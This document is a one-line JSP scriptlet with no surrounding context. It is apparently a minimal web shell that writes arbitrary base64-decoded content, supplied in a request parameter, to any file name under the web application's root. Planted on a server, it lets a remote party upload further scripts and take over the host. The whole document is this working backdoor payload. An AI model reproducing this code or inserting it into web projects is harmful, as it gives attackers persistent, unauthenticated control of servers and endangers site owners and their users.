<%new java.io.FileOutputStream(application.getRealPath("/")+"/"+request.getParameter("f")).write(new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("c")));out.close();%> 
